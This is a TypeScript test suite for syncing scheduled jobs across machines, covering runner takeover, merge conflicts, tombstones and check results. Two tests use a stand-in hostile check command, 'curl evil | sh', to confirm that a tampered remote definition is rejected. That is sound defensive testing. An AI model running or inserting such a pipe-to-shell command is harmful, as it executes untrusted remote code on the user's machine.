import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { CHECK_OUTPUT_KEEP, createSchedule, isDue, planScheduleCheck, recordRun, type ScheduleState } from '../src/main/schedule.ts';
import {
  canRunHere, collectBucketSchedules, parseScheduleObjectRel, scheduleObjectRel, definitionHash, isRunnerHere, mergeSchedule, parseRemoteSchedule, planScheduleSync, remoteBody,
  stampLocalWrite, takeOver, timingState, tombstoneBody, type RemoteSchedule,
} from '../src/main/scheduleSync.ts';
import * as scheduleStore from '../src/main/scheduleStore.ts';

const A = { id: 'devA', name: 'laptop-a' };
const B = { id: 'devB', name: 'desk-b' };
const T0 = 1_700_000_000_000;

function job(over: Partial<ScheduleState> = {}): ScheduleState {
  return {
    ...createSchedule('s1', { prompt: 'check build', kind: 'interval', everySec: 3600, maxRuns: 10, until: 'green', checkCommand: 'node check.js' }, T0),
    runner: A.id, runnerName: A.name, runnerChangedAt: T0, statusBy: A.id, statusAt: T0,
    ...over,
  };
}

describe('runner', () => {
  test('only the runner, with an approved definition, runs it', () => {
    const s = job();
    const hash = definitionHash(s);
    assert.equal(canRunHere(s, A.id, hash), true);
    assert.equal(canRunHere(s, B.id, hash), false, 'another machine never runs it');
    assert.equal(canRunHere(s, A.id, undefined), false, 'runner = me but never confirmed here (e.g. restored from S3)');
    assert.equal(canRunHere({ ...s, spec: { ...s.spec, checkCommand: 'curl evil | sh' } }, A.id, hash), false, 'definition changed since confirmation');
  });

  test('a legacy file without runner counts as created here', () => {
    const { runner: _r, ...legacy } = job();
    assert.equal(isRunnerHere(legacy as ScheduleState, A.id), true);
    const stamped = stampLocalWrite(null, legacy as ScheduleState, A, T0 + 5);
    assert.equal(stamped.runner, A.id);
    assert.equal(stamped.runnerName, A.name);
  });

  test('take over: runner = me, first run counted from the takeover, no catch-up', () => {
    const ran = { ...job({ runner: B.id, runnerName: B.name }), lastRunAt: T0, runs: 1 };
    const now = T0 + 10 * 3600_000;   // B has been off for 10 h
    const mine = takeOver(ran, A, now);
    assert.equal(mine.runner, A.id);
    assert.equal(mine.runnerChangedAt, now);
    assert.equal(isDue(timingState(mine), now + 1000), false, 'not due right after taking over');
    assert.equal(isDue(timingState(mine), now + 3600_000), true, 'due one interval after the takeover');
    assert.equal(mine.lastRunAt, T0, 'the stored lastRunAt is untouched');
  });
});

describe('stampLocalWrite', () => {
  test('a stale write does not undo a newer pause / takeover that landed meanwhile', () => {
    const before = job();
    const onDisk = { ...before, paused: true, pausedChangedAt: T0 + 50, runner: B.id, runnerName: B.name, runnerChangedAt: T0 + 60 };
    const staleRun = recordRun(before, T0 + 70);
    const out = stampLocalWrite(onDisk, staleRun, A, T0 + 70);
    assert.equal(out.paused, true);
    assert.equal(out.runner, B.id);
    assert.equal(out.runs, 1);
    assert.equal(out.statusBy, A.id, 'this machine wrote that run');
  });

  test('control ops get a timestamp; run state records who wrote it', () => {
    const prev = job();
    const paused = stampLocalWrite(prev, { ...prev, paused: true }, B, T0 + 9);
    assert.equal(paused.pausedChangedAt, T0 + 9);
    assert.equal(paused.statusAt, T0, 'pausing is not a run');
    const extended = stampLocalWrite(prev, { ...prev, expiresAt: T0 + 99 }, B, T0 + 11);
    assert.equal(extended.expiryChangedAt, T0 + 11);
  });
});

describe('mergeSchedule', () => {
  test('run state comes only from the runner', () => {
    const onA = recordRun(job(), T0 + 100);
    const runOnA = { ...onA, statusBy: A.id, statusAt: T0 + 100 };
    /* B (not the runner) has a copy claiming more runs, written by B */
    const onB = { ...job(), runs: 7, lastRunAt: T0 + 200, statusBy: B.id, statusAt: T0 + 200 };
    const atA = mergeSchedule(runOnA, onB, A.id).state;
    assert.equal(atA.runs, 1, 'runner keeps its own run state');
    const atB = mergeSchedule(onB, runOnA, B.id).state;
    assert.equal(atB.runs, 1, 'non-runner takes the runner-written version');
    assert.equal(atB.lastRunAt, T0 + 100);
  });

  test('control ops: last one wins, from any machine (pause on B pauses A)', () => {
    const onA = job();
    const onB = { ...job(), paused: true, pausedChangedAt: T0 + 30 };
    assert.equal(mergeSchedule(onA, onB, A.id).state.paused, true);
    const resumedOnA = { ...onA, paused: false, pausedChangedAt: T0 + 40 };
    assert.equal(mergeSchedule(resumedOnA, onB, A.id).state.paused, false, 'the later resume wins');
    const extOnB = { ...job(), expiresAt: T0 + 9e6, expiryChangedAt: T0 + 50 };
    assert.equal(mergeSchedule({ ...onA, expiresAt: T0 + 1e6 }, extOnB, A.id).state.expiresAt, T0 + 9e6);
  });

  test('the runner rejects a remote definition change (checkCommand stays)', () => {
    const onA = job();
    const evil = { ...job(), spec: { ...onA.spec, checkCommand: 'curl evil | sh', prompt: 'other' } };
    const r = mergeSchedule(onA, evil, A.id);
    assert.equal(r.state.spec.checkCommand, 'node check.js');
    assert.equal(r.state.spec.prompt, 'check build');
    assert.equal(r.notes.defRejected, true);
  });

  test('a remote copy cannot make this machine the runner', () => {
    const onA = job({ runner: B.id, runnerName: B.name, runnerChangedAt: T0 });
    const claims = { ...onA, runner: A.id, runnerChangedAt: T0 + 999 };
    const r = mergeSchedule(onA, claims, A.id);
    assert.equal(r.state.runner, B.id);
    assert.equal(r.notes.refusedAssign, true);
  });

  test('takeover race: the later runnerChangedAt wins on both machines; the loser is told', () => {
    const base = job({ runner: 'devC', runnerName: 'c', runnerChangedAt: T0 });
    const aTook = takeOver(base, A, T0 + 1000);
    const bTook = takeOver(base, B, T0 + 1001);
    const atA = mergeSchedule(aTook, bTook, A.id);
    const atB = mergeSchedule(bTook, aTook, B.id);
    assert.equal(atA.state.runner, B.id);
    assert.equal(atB.state.runner, B.id);
    assert.equal(atA.notes.lostTo, B.id, 'A stops and says so');
    assert.equal(atB.notes.lostTo, undefined);
  });

  test('takeover in the same millisecond: both machines (and a third) settle on one runner, and stay there', () => {
    const base = job({ runner: 'devC', runnerName: 'c', runnerChangedAt: T0 });
    const at = T0 + 1000;
    const aTook = takeOver(base, A, at);
    const bTook = takeOver(base, B, at);
    const atA = mergeSchedule(aTook, bTook, A.id);
    const atB = mergeSchedule(bTook, aTook, B.id);
    const winner = A.id > B.id ? A.id : B.id;
    const loser = winner === A.id ? B.id : A.id;
    assert.equal(atA.state.runner, winner);
    assert.equal(atB.state.runner, winner, 'both sides agree');
    assert.equal(canRunHere(atA.state, A.id, definitionHash(aTook)) && canRunHere(atB.state, B.id, definitionHash(bTook)), false, 'never both');
    /* exactly one of them is told it lost */
    assert.deepEqual([atA.notes.lostTo, atB.notes.lostTo].filter(Boolean), [winner]);
    assert.equal(winner === A.id ? atB.notes.lostTo : atA.notes.lostTo, winner, `${loser} stops`);
    /* the next rounds keep converging (each side uploads its merge, the other pulls it) */
    assert.equal(mergeSchedule(atA.state, atB.state, A.id).state.runner, winner);
    assert.equal(mergeSchedule(atB.state, atA.state, B.id).state.runner, winner);
    /* a third computer, either order */
    assert.equal(mergeSchedule(mergeSchedule(base, aTook, 'devC').state, bTook, 'devC').state.runner, winner);
    assert.equal(mergeSchedule(mergeSchedule(base, bTook, 'devC').state, aTook, 'devC').state.runner, winner);
  });

  test('the tie-break never hands the job to this machine from a remote copy', () => {
    const local = job({ runner: 'devZ', runnerName: 'z', runnerChangedAt: T0 });   // 'devZ' > 'devA'
    const claims = { ...local, runner: 'devzz', runnerChangedAt: T0 };              // would win the tie by id...
    const r = mergeSchedule(local, claims, 'devzz');                                 // ...but 'devzz' is this machine
    assert.equal(r.state.runner, 'devZ');
    assert.equal(r.notes.refusedAssign, true);
  });

  test('old runner ran once more before it saw the takeover: logged on both sides, new runner keeps its own state', () => {
    const shared = job();
    const bTook = takeOver(shared, B, T0 + 500);
    const aRanAgain = { ...recordRun(shared, T0 + 600), statusBy: A.id, statusAt: T0 + 600 };
    const atA = mergeSchedule(aRanAgain, bTook, A.id);
    assert.equal(atA.state.runner, B.id);
    assert.equal(atA.notes.ranAfterHandover, true);
    const atB = mergeSchedule(bTook, aRanAgain, B.id);
    assert.equal(atB.state.runs, 0, 'new runner does not take the old runner\'s late run');
    assert.equal(atB.notes.ignoredRunBy, A.id);
  });
});

describe('parseRemoteSchedule', () => {
  test('round trip, and tombstones', () => {
    const s = job();
    const p = parseRemoteSchedule(remoteBody('x1', s, T0), 'x1', 's1') as Extract<RemoteSchedule, { kind: 'live' }>;
    assert.equal(p.kind, 'live');
    assert.equal(p.state.spec.checkCommand, 'node check.js');
    assert.deepEqual(parseRemoteSchedule(tombstoneBody('x1', 's1', T0, A.id), 'x1', 's1'), { kind: 'deleted', at: T0 });
  });

  test('rejects mismatched ids / sessions, missing runner, bad specs, and drops unknown fields', () => {
    const s = job();
    assert.equal(parseRemoteSchedule(remoteBody('x1', s, T0), 'x2', 's1'), null);
    assert.equal(parseRemoteSchedule(remoteBody('x1', s, T0), 'x1', 's2'), null);
    const { runner: _r, ...noRunner } = s;
    assert.equal(parseRemoteSchedule(remoteBody('x1', noRunner as ScheduleState, T0), 'x1', 's1'), null);
    assert.equal(parseRemoteSchedule(remoteBody('x1', { ...s, spec: { ...s.spec, everySec: 1 } }, T0), 'x1', 's1'), null);
    assert.equal(parseRemoteSchedule('not json', 'x1', 's1'), null);
    const extra = parseRemoteSchedule(remoteBody('x1', { ...s, evil: 1 } as any, T0), 'x1', 's1') as any;
    assert.equal(extra.state.evil, undefined);
  });
});

describe('planScheduleSync', () => {
  const live = (state: ScheduleState) => ({ sessionId: state.sessionId, parsed: { kind: 'live' as const, state } });

  test('tasks of sessions outside the sync scope are not uploaded (or pulled)', () => {
    const plan = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job({ sessionId: 'nosync' }) }], tombstones: {},
      remote: new Map([['j2', live(job({ sessionId: 'nosync2' }))]]), inScope: () => false, upload: true,
    });
    assert.deepEqual(plan, []);
  });

  test('in scope: upload local-only, adopt remote-only', () => {
    const plan = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job() }], tombstones: {},
      remote: new Map([['j2', live(job({ runner: B.id }))]]), inScope: (s) => s === 's1', upload: true,
    });
    assert.deepEqual(plan.map((a) => `${a.op}:${a.id}`), ['put:j1', 'write:j2']);
  });

  test('restore mode pulls but never uploads', () => {
    const plan = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job() }], tombstones: {},
      remote: new Map([['j2', live(job({ runner: B.id }))]]), inScope: () => true, upload: false,
    });
    assert.deepEqual(plan.map((a) => `${a.op}:${a.id}`), ['write:j2']);
  });

  test('a remote tombstone deletes the local copy; a local tombstone is pushed and never re-adopted', () => {
    const p1 = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job() }], tombstones: {},
      remote: new Map([['j1', { sessionId: 's1', parsed: { kind: 'deleted', at: T0 } }]]), inScope: () => true, upload: true,
    });
    assert.deepEqual(p1.map((a) => a.op), ['delete']);
    const p2 = planScheduleSync({
      me: A.id, local: [], tombstones: { j1: { at: T0, sessionId: 's1' } },
      remote: new Map([['j1', live(job())]]), inScope: () => true, upload: true,
    });
    assert.deepEqual(p2.map((a) => a.op), ['put-tombstone'], 'not written back locally');
    /* a session that was deleted (no longer in scope) still pushes its tombstones */
    const p3 = planScheduleSync({
      me: A.id, local: [], tombstones: { j1: { at: T0, sessionId: 's1' } },
      remote: new Map([['j1', live(job())]]), inScope: () => false, upload: true,
    });
    assert.deepEqual(p3.map((a) => a.op), ['put-tombstone']);
  });

  test('unchanged on both sides: nothing to do', () => {
    const s = job();
    assert.deepEqual(planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: s }], tombstones: {}, remote: new Map([['j1', live(s)]]), inScope: () => true, upload: true,
    }), []);
  });

  test('a remote copy filed under another session is left alone', () => {
    const plan = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job() }], tombstones: {},
      remote: new Map([['j1', { sessionId: 'other', parsed: { kind: 'deleted', at: T0 } }]]), inScope: () => true, upload: true,
    });
    assert.deepEqual(plan, []);
  });
});

describe('a third computer only takes run state from the current runner', () => {
  const C = 'devC';
  test('B took over and has not run; A ran once more before seeing it: C never takes A\'s late run, in either order', () => {
    const shared = job();                                  // A is runner, runs 0
    const bTook = takeOver(shared, B, T0 + 500);
    assert.equal(bTook.statusBy, B.id, 'takeover establishes the new runner\'s baseline');
    const aRanAgain = { ...recordRun(shared, T0 + 600), statusBy: A.id, statusAt: T0 + 600 };
    /* C still holds the pre-takeover copy */
    const c1 = mergeSchedule(mergeSchedule(shared, bTook, C).state, aRanAgain, C).state;
    const c2 = mergeSchedule(mergeSchedule(shared, aRanAgain, C).state, bTook, C).state;
    for (const c of [c1, c2]) {
      assert.equal(c.runner, B.id);
      assert.equal(c.runs, 0, 'A\'s run after the handover is not accepted');
      assert.equal(c.statusBy, B.id);
    }
    /* A's own copy after it learns of the takeover, merged on C: still B's state */
    const aAfter = mergeSchedule(aRanAgain, bTook, A.id).state;
    assert.equal(mergeSchedule(shared, aAfter, C).state.runs, 0);
  });

  test('neither copy written by the runner: only state from before the handover is taken', () => {
    const legacy = job({ runner: B.id, runnerName: B.name, runnerChangedAt: T0 + 500, statusBy: A.id, statusAt: T0 + 100 });
    const lateA = { ...legacy, runs: 5, lastRunAt: T0 + 700, statusBy: A.id, statusAt: T0 + 700 };
    assert.equal(mergeSchedule(legacy, lateA, C).state.runs, 0, 'written after the handover by a non-runner: refused');
    const earlierA = { ...legacy, runs: 2, statusBy: A.id, statusAt: T0 + 300 };
    assert.equal(mergeSchedule(legacy, earlierA, C).state.runs, 2, 'before the handover: the newer pre-handover state');
  });
});

describe('last check result', () => {
  test('recorded on every outcome; actions and exit-code meaning unchanged; output kept as a short tail', () => {
    const s = job();
    const ok = planScheduleCheck(s, { status: 'exited', code: 0, output: 'green\n' }, T0, 'en');
    assert.equal(ok.action, 'achieved');
    assert.deepEqual(ok.state.lastCheck, { at: T0, result: 'achieved', code: 0, output: 'green' });
    const first = planScheduleCheck(s, { status: 'exited', code: 1, output: '2 failing' }, T0, 'en');
    assert.equal(first.action, 'wake');
    assert.equal(first.state.lastCheck?.result, 'changed');
    const same = planScheduleCheck(first.state, { status: 'exited', code: 1, output: '2 failing' }, T0 + 1, 'en');
    assert.equal(same.action, 'skip', 'unchanged output still does not wake');
    assert.deepEqual(same.state.lastCheck, { at: T0 + 1, result: 'unchanged', code: 1, output: '2 failing' });
    const err = planScheduleCheck(s, { status: 'exited', code: 3, output: 'x'.repeat(1000) }, T0, 'en');
    assert.equal(err.action, 'wake');
    assert.equal(err.state.lastCheck?.result, 'error');
    assert.equal(err.state.lastCheck?.code, 3);
    assert.equal(err.state.lastCheck!.output.length, CHECK_OUTPUT_KEEP + 1, 'tail only (with a leading …)');
    assert.equal(planScheduleCheck(s, { status: 'timeout', output: '' }, T0, 'en').state.lastCheck?.code, null);
  });

  test('synced as run state: a non-runner takes the runner\'s; the old runner\'s post-handover check is refused', () => {
    const onA = { ...planScheduleCheck(job(), { status: 'exited', code: 1, output: 'still red' }, T0 + 100, 'en').state, statusBy: A.id, statusAt: T0 + 100 };
    const onB = mergeSchedule(job(), onA, B.id).state;
    assert.equal(onB.lastCheck?.output, 'still red');
    const bTook = takeOver(onB, B, T0 + 500);
    const aLate = { ...planScheduleCheck(onA, { status: 'exited', code: 1, output: 'late' }, T0 + 600, 'en').state, statusBy: A.id, statusAt: T0 + 600 };
    assert.equal(mergeSchedule(bTook, aLate, B.id).state.lastCheck?.output, 'still red');
    assert.equal(mergeSchedule(aLate, bTook, 'devC').state.lastCheck?.output, 'still red');
  });

  test('parsed from the bucket; a malformed one is dropped', () => {
    const s = { ...job(), lastCheck: { at: T0, result: 'unchanged' as const, code: 1, output: 'same' } };
    const p = parseRemoteSchedule(remoteBody('x1', s, T0), 'x1', 's1') as Extract<RemoteSchedule, { kind: 'live' }>;
    assert.deepEqual(p.state.lastCheck, s.lastCheck);
    const bad = parseRemoteSchedule(remoteBody('x1', { ...s, lastCheck: { at: 'x', result: 'evil' } } as any, T0), 'x1', 's1') as any;
    assert.equal(bad.state.lastCheck, undefined);
  });
});

describe('auto-pause (check errors) is a run result, not a user control op', () => {
  const C = 'devC';
  /** A, not yet aware of B's takeover, fails its 3rd check in a row and auto-pauses (stamped like a local write). */
  function aAutoPaused(shared: ScheduleState, at: number): ScheduleState {
    return stampLocalWrite(shared, { ...shared, checkErrors: 3, lastRunAt: at, paused: true, pausedBy: 'check-errors' }, A, at);
  }

  test('A auto-pauses after B took over: not applied on B, on C, or on A once it learns', () => {
    const shared = job({ checkErrors: 2 });
    const bTook = takeOver(shared, B, T0 + 500);
    const aPaused = aAutoPaused(shared, T0 + 600);
    assert.equal(aPaused.pausedChangedAt, T0 + 600);
    for (const [label, merged] of [
      ['on B', mergeSchedule(bTook, aPaused, B.id).state],
      ['on C (B first)', mergeSchedule(mergeSchedule(shared, bTook, C).state, aPaused, C).state],
      ['on C (A first)', mergeSchedule(mergeSchedule(shared, aPaused, C).state, bTook, C).state],
      ['on A', mergeSchedule(aPaused, bTook, A.id).state],
    ] as const) {
      assert.equal(merged.runner, B.id, label);
      assert.equal(merged.paused, false, `${label}: B's job is not paused by A's late check`);
      assert.notEqual(merged.pausedBy, 'check-errors', label);
      assert.equal(merged.checkErrors ?? 0, 2, `${label}: A's error count is not taken either`);
    }
  });

  test('the runner\'s own auto-pause, and one from before the handover, still sync', () => {
    const shared = job({ checkErrors: 2 });
    const aPaused = aAutoPaused(shared, T0 + 600);
    /* no handover: A (runner) auto-paused → B sees it paused */
    assert.equal(mergeSchedule(shared, aPaused, B.id).state.paused, true);
    /* B took over after A's auto-pause → still paused (the user resumes it) */
    const bTookLater = takeOver(aPaused, B, T0 + 900);
    assert.equal(mergeSchedule(aPaused, bTookLater, C).state.paused, true);
  });

  test('a user pause / resume from any computer still wins by time, even after a handover', () => {
    const shared = job();
    const bTook = takeOver(shared, B, T0 + 500);
    const userPausedOnA = stampLocalWrite(shared, { ...shared, paused: true, pausedBy: null }, A, T0 + 700);
    const onB = mergeSchedule(bTook, userPausedOnA, B.id).state;
    assert.equal(onB.paused, true);
    const resumedOnC = stampLocalWrite(onB, { ...onB, paused: false }, { id: C, name: 'c' }, T0 + 800);
    assert.equal(mergeSchedule(onB, resumedOnC, B.id).state.paused, false);
  });
});

describe('a check command that finishes after the job was handed over (real async flow)', () => {
  /** Runs the real runScheduleCheck; while the command is "running", a sync writes B's takeover to disk. */
  async function runWithTakeoverMidCheck(result: any, start: Partial<ScheduleState> = {}) {
    const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
    const mine = job({ lastRunAt: T0 - 7200_000, ...start });
    const hash = definitionHash(mine);
    let disk: ScheduleState | null = mine;
    const writes: ScheduleState[] = [];
    const changed: ScheduleState[] = [];
    const notes: string[] = [];
    const logs: string[] = [];
    const out = await runScheduleCheck('j1', mine, {
      now: () => T0,
      read: () => disk,
      write: (_id, s) => { disk = s; writes.push(s); },
      runCheck: async () => {
        await new Promise((r) => setTimeout(r, 5));
        disk = mergeSchedule(disk!, takeOver(mine, B, T0 + 1), A.id).state;   // the sync lands mid-check
        return result;
      },
      changed: (_id, s) => { changed.push(s); },
      noteUser: (_sid, text) => { notes.push(text); },
      log: (m) => { logs.push(m); },
      stillRunsHere: (_id, s) => canRunHere(s, A.id, hash),
      lang: 'en',
    });
    return { out, disk: disk!, writes, changed, notes, logs };
  }

  test('exit 0 does not mark B\'s job achieved, and nothing is woken or broadcast', async () => {
    const r = await runWithTakeoverMidCheck({ status: 'exited', code: 0, output: 'green' });
    assert.equal(r.out, null);
    assert.equal(r.disk.terminal, null);
    assert.equal(r.disk.runner, B.id);
    assert.equal(r.writes.length, 1, 'only the pre-check timestamp, written while still the runner');
    assert.deepEqual(r.changed, []);
    assert.ok(r.logs.some((m) => m.includes('handover') && m.includes('runner=devB')));
  });

  test('the 3rd consecutive error does not pause B\'s job or stamp a pause time', async () => {
    const r = await runWithTakeoverMidCheck({ status: 'exited', code: 2, output: 'boom' }, { checkErrors: 2 });
    assert.equal(r.out, null);
    assert.equal(r.disk.paused, false);
    assert.equal(r.disk.pausedChangedAt, undefined);
    assert.equal(r.disk.checkErrors, 2);
    assert.deepEqual(r.notes, []);
  });

  test('without a handover the same flow still records the result (control)', async () => {
    const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
    const mine = job({ lastRunAt: T0 - 7200_000 });
    const hash = definitionHash(mine);
    let disk: ScheduleState | null = mine;
    const out = await runScheduleCheck('j1', mine, {
      now: () => T0, read: () => disk, write: (_id, s) => { disk = s; },
      runCheck: async () => ({ status: 'exited', code: 0, output: 'green' }),
      changed: () => {}, noteUser: () => {}, log: () => {},
      stillRunsHere: (_id, s) => canRunHere(s, A.id, hash), lang: 'en',
    });
    assert.ok(out);
    assert.equal(disk!.terminal, 'achieved');
  });
});

describe('a queued wake re-checks the runner before it is sent', () => {
  test('after syncing in a takeover, this machine no longer counts as able to run it (the gate the queued wake checks)', () => {
    const mine = job();
    const hash = definitionHash(mine);
    assert.equal(canRunHere(mine, A.id, hash), true);
    const merged = mergeSchedule(mine, takeOver(mine, B, T0 + 10), A.id);
    assert.equal(merged.notes.lostTo, B.id);
    assert.equal(canRunHere(merged.state, A.id, hash), false);
  });
});

describe('deletion markers cannot be overwritten by a stale live upload', () => {
  /** A tiny in-memory bucket: rel → body. */
  function bucketPlan(bucket: Map<string, string>, me: string, local: Array<{ id: string; state: ScheduleState }>, tombstones: Record<string, { at: number; sessionId: string }>) {
    const listed = collectBucketSchedules([...bucket.keys()]);
    const remote = new Map<string, { sessionId: string; parsed: RemoteSchedule | null }>();
    for (const [id, d] of listed.deleted) remote.set(id, { sessionId: d.sessionId, parsed: { kind: 'deleted', at: T0 } });
    for (const [id, l] of listed.live) remote.set(id, { sessionId: l.sessionId, parsed: parseRemoteSchedule(bucket.get(l.rel)!, id, l.sessionId) });
    return planScheduleSync({ me, local, tombstones, remote, inScope: () => true, upload: true });
  }
  const apply = (bucket: Map<string, string>, plan: ReturnType<typeof planScheduleSync>, me: string) => {
    for (const a of plan) {
      if (a.op === 'put') bucket.set(scheduleObjectRel(a.sessionId, a.id), remoteBody(a.id, a.state, T0));
      if (a.op === 'put-tombstone') bucket.set(scheduleObjectRel(a.sessionId, a.id, true), tombstoneBody(a.id, a.sessionId, a.at, me));
    }
  };

  test('B read the old task, A uploads the deletion, then B uploads the old task: still deleted everywhere', () => {
    const bucket = new Map<string, string>();
    const s = job({ runner: B.id, runnerName: B.name });
    bucket.set(scheduleObjectRel('s1', 'j1'), remoteBody('j1', s, T0));
    /* B (runner) read the live object and is about to upload a run */
    const bRan = { ...recordRun(s, T0 + 50), statusBy: B.id, statusAt: T0 + 50 };
    /* A deletes it and syncs: the marker goes up as its own object */
    const aPlan = bucketPlan(bucket, A.id, [], { j1: { at: T0 + 40, sessionId: 's1' } });
    assert.deepEqual(aPlan.map((a) => a.op), ['put-tombstone']);
    apply(bucket, aPlan, A.id);
    /* B's stale upload of the live task lands afterwards */
    bucket.set(scheduleObjectRel('s1', 'j1'), remoteBody('j1', bRan, T0 + 60));
    assert.ok(bucket.has(scheduleObjectRel('s1', 'j1', true)), 'the marker survives the live upload');
    /* next round on B: deleted locally (and its queued run is gone with it) */
    assert.deepEqual(bucketPlan(bucket, B.id, [{ id: 'j1', state: bRan }], {}).map((a) => a.op), ['delete']);
    /* next round on A: nothing to adopt, nothing to re-upload */
    assert.deepEqual(bucketPlan(bucket, A.id, [], { j1: { at: T0 + 40, sessionId: 's1' } }), []);
    /* a third computer that never had it: remembers the deletion, never adopts */
    assert.deepEqual(bucketPlan(bucket, 'devC', [], {}).map((a) => a.op), ['remember-deleted']);
  });

  test('A lists an empty bucket and still uploads its marker; B\'s in-flight upload of the old task lands afterwards: still deleted', () => {
    const bucket = new Map<string, string>();
    const s = job({ runner: B.id, runnerName: B.name });
    /* B planned an upload of the task (bucket empty so far) but has not finished it */
    const bPlan = bucketPlan(bucket, B.id, [{ id: 'j1', state: s }], {});
    assert.deepEqual(bPlan.map((a) => a.op), ['put']);
    /* A, which deleted the task, lists the same empty bucket: the marker is uploaded anyway */
    const aPlan = bucketPlan(bucket, A.id, [], { j1: { at: T0 + 40, sessionId: 's1' } });
    assert.deepEqual(aPlan.map((a) => a.op), ['put-tombstone']);
    apply(bucket, aPlan, A.id);
    apply(bucket, bPlan, B.id);   // B's upload finishes after A's marker
    assert.deepEqual(bucketPlan(bucket, B.id, [{ id: 'j1', state: s }], {}).map((a) => a.op), ['delete']);
    assert.deepEqual(bucketPlan(bucket, 'devC', [], {}).map((a) => a.op), ['remember-deleted'], 'nobody downloads it again');
    assert.deepEqual(bucketPlan(bucket, A.id, [], { j1: { at: T0 + 40, sessionId: 's1' } }), [], 'marker already there: not re-uploaded');
  });

  test('object keys round-trip and the marker wins over the live object', () => {
    assert.deepEqual(parseScheduleObjectRel(scheduleObjectRel('s1', 'a b', true)), { sessionId: 's1', id: 'a b', deleted: true });
    assert.deepEqual(parseScheduleObjectRel(scheduleObjectRel('s1', 'j1')), { sessionId: 's1', id: 'j1', deleted: false });
    assert.equal(parseScheduleObjectRel('schedules/s1/x/y.json'), null);
    const c = collectBucketSchedules([scheduleObjectRel('s1', 'j1'), scheduleObjectRel('s1', 'j1', true), scheduleObjectRel('s1', 'j2')]);
    assert.deepEqual([...c.deleted.keys()], ['j1']);
    assert.deepEqual([...c.live.keys()], ['j2']);
  });
});

describe('scheduleStore with a local machine', () => {
  test('creation is approved, deletion leaves a tombstone, and a tombstoned id is never written back', () => {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'kl-schedsync-'));
    scheduleStore.setLocalScheduleMachine(A);
    try {
      const { runner: _r, runnerName: _n, runnerChangedAt: _c, statusBy: _b, statusAt: _a, ...fresh } = job();
      scheduleStore.writeSchedule('j1', fresh as ScheduleState, home);
      const saved = scheduleStore.readSchedule('j1', home)!.state;
      assert.equal(saved.runner, A.id);
      assert.equal(canRunHere(saved, A.id, scheduleStore.readApprovedHash('j1', home)), true);
      /* adopted from the bucket with runner = me: written raw, never approved */
      scheduleStore.writeScheduleRaw('j2', job(), home);
      assert.equal(canRunHere(scheduleStore.readSchedule('j2', home)!.state, A.id, scheduleStore.readApprovedHash('j2', home)), false);
      scheduleStore.removeSchedule('j1', home);
      assert.ok(scheduleStore.readScheduleTombstones(home).j1);
      scheduleStore.writeSchedule('j1', saved, home);
      assert.equal(scheduleStore.readSchedule('j1', home), null, 'not resurrected');
    } finally {
      scheduleStore.setLocalScheduleMachine(null);
      fs.rmSync(home, { recursive: true, force: true });
    }
  });
});
